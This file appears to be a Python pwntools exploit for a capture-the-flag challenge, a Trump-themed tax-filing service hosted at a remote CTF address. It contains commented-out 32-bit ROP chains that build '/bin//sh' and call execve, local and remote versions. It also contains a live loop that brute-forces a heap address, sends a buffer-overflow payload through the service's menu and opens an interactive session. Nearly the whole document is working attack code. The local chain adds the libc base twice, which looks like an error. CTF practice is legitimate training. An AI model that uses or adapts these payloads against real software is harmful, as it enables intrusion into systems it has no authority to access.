from pwn import *
import re, sys
import struct
import time


# for leak Libc base address
#p += struct.pack('<I', libc_addr +  0x0804AFCC) #.got pritf address
#p += struct.pack('<I', libc_addr +  0x00000000) # pop edx ; ret

'''
<for exploit local>

libc_addr = 0xf755e000
data_addr = 0x0804b000

p += struct.pack('<I', libc_addr +  libc_addr + 0x00001aa6) # pop edx ; ret
p += struct.pack('<I', libc_addr +  data_addr) # @ .data
p += struct.pack('<I', libc_addr +  libc_addr + 0x0002406e) # pop eax ; ret
p += '/bin'
p += struct.pack('<I', libc_addr +  libc_addr + 0x0006be8b) # mov dword ptr [edx], eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00001aa6) # pop edx ; ret
p += struct.pack('<I', libc_addr +  data_addr+4) # @ .data + 4
p += struct.pack('<I', libc_addr +  libc_addr + 0x0002406e) # pop eax ; ret
p += '//sh'
p += struct.pack('<I', libc_addr +  libc_addr + 0x0006be8b) # mov dword ptr [edx], eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00001aa6) # pop edx ; ret
p += struct.pack('<I', libc_addr +  data_addr+8) # @ .data + 8
p += struct.pack('<I', libc_addr +  libc_addr + 0x0002c77c) # xor eax, eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x0006be8b) # mov dword ptr [edx], eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00018395) # pop ebx ; ret
p += struct.pack('<I', libc_addr +  data_addr) # @ .data
p += struct.pack('<I', libc_addr +  libc_addr + 0x000b52d7) # pop ecx ; ret
p += struct.pack('<I', libc_addr +  data_addr+8) # @ .data + 8
p += struct.pack('<I', libc_addr +  libc_addr + 0x00001aa6) # pop edx ; ret
p += struct.pack('<I', libc_addr +  data_addr+8) # @ .data + 8
p += struct.pack('<I', libc_addr +  libc_addr + 0x0002c77c) # xor eax, eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00004bcc) # inc eax ; ret
p += struct.pack('<I', libc_addr +  libc_addr + 0x00002c87) # int 0x80

<for exploit remote>

p = ''
p += struct.pack('<I', libc_addr + 0x00001aa6) # pop edx ; ret
p += struct.pack('<I', data_addr) # @ .data
p += struct.pack('<I', libc_addr + 0x00023f97) # pop eax ; ret
p += '/bin'
p += struct.pack('<I', libc_addr +  0x0006b34b) # mov dword ptr [edx], eax ; ret
p += struct.pack('<I', libc_addr +  0x00001aa6) # pop edx ; ret
p += struct.pack('<I', data_addr+4) # @ .data + 4
p += struct.pack('<I', libc_addr +  0x00023f97) # pop eax ; ret
p += '//sh'
p += struct.pack('<I', libc_addr +  0x0006b34b) # mov dword ptr [edx], eax ; ret
p += struct.pack('<I', libc_addr +  0x00001aa6) # pop edx ; ret
p += struct.pack('<I', data_addr+8) # @ .data + 8
p += struct.pack('<I', libc_addr +  0x0002c5fc) # xor eax, eax ; ret
p += struct.pack('<I', libc_addr +  0x0006b34b) # mov dword ptr [edx], eax ; ret
p += struct.pack('<I', libc_addr +  0x00018395) # pop ebx ; ret
p += struct.pack('<I', data_addr) # @ .data
p += struct.pack('<I', libc_addr +  0x000b3eb7) # pop ecx ; ret
p += struct.pack('<I', data_addr+8) # @ .data + 8
p += struct.pack('<I', libc_addr +  0x00001aa6) # pop edx ; ret
p += struct.pack('<I', data_addr+8) # @ .data + 8
p += struct.pack('<I', libc_addr +  0x0002c5fc) # xor eax, eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00007eec) # inc eax ; ret
p += struct.pack('<I', libc_addr +  0x00002c87) # int 0x80
'''


count = 0

while 1:
	count += 1
	heap_addr = 0x0804c03a +count*0x1000
	p = ''
	p += struct.pack('<I', 0x080484F8) # .got printf address
	p += struct.pack('<I', 0x080488CC) #  dummy address
	p += struct.pack('<I', heap_addr) # Trump's password address
	# Set up our payload
	payload = 'a'*25
	payload += p

	print p.encode('hex')

	print payload

	output = []
	print "[+]"+str(count)
	conn = remote('irs.pwn.republican' ,4127)

	#conn =remote('127.0.0.1', 1337)
	#raw_input()

	line = conn.recvuntil('Donald Trump')
	print line
	conn.send("1\n")

	line = conn.recvuntil('Enter the name: ')
	print line
	conn.send("aa\n")

	line = conn.recvuntil('Enter the password: ')
	print line
	conn.send("aa\n")

	line = conn.recvuntil('Enter the income: ')
	print line
	conn.send("1\n")

	line = conn.recvuntil('Enter the deductions: ')
	print line
	conn.send("1\n")

	line = conn.recvuntil('1 - aa')
	print line
	conn.send("3\n")

	line = conn.recvuntil('Enter the name of the file to edit: ')
	print line
	conn.send("aa\n")

	line = conn.recvuntil('Enter the password: ')
	print line
	conn.send("aa\n")

	line = conn.recvuntil('Enter the new income: ')
	print line
	conn.send("1\n")

	line = conn.recvuntil('Enter the new deductible: ')
	print line
	conn.send("1\n")

	line = conn.recvuntil('y/n')
	print line
	conn.send(payload+'\n')
	try:

		line = conn.recvline()
		print line
		line = conn.recvline()
		print line
		line = conn.recvline()
		print line
		time.sleep(1)
		conn.interactive()
	except EOFError:
		print "error\n"
